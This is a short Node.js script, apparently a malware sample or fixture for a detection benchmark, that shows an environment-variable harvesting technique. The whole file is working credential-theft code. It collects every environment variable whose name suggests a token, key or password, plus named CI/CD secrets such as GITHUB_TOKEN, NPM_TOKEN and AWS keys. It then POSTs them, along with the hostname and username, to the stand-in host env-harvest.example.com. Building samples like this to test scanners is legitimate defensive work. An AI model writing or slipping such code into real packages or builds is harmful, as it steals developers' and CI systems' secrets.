// Dynamic env harvesting: iterates ALL env vars looking for secrets
// Technique: env_harvesting_dynamic — Object.keys(process.env) + pattern match + exfil
// Real-world: 479 samples in Datadog benchmark

const http = require('http');
const os = require('os');

// Harvest all env vars matching sensitive patterns
const sensitivePatterns = /token|secret|key|password|auth|credential|api.?key|private/i;

const harvested = {};
const envKeys = Object.keys(process.env);
for (const key of envKeys) {
  if (sensitivePatterns.test(key)) {
    harvested[key] = process.env[key];
  }
}

// Also grab common CI/CD vars
const ciVars = ['CI', 'GITHUB_TOKEN', 'GITLAB_TOKEN', 'NPM_TOKEN', 'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY', 'DOCKER_PASSWORD', 'CODECOV_TOKEN'];
for (const v of ciVars) {
  if (process.env[v]) harvested[v] = process.env[v];
}

if (Object.keys(harvested).length > 0) {
  const payload = JSON.stringify({
    host: os.hostname(),
    user: os.userInfo().username,
    env: harvested
  });

  const req = http.request({
    hostname: 'env-harvest.example.com',
    path: '/c',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(payload);
  req.end();
}
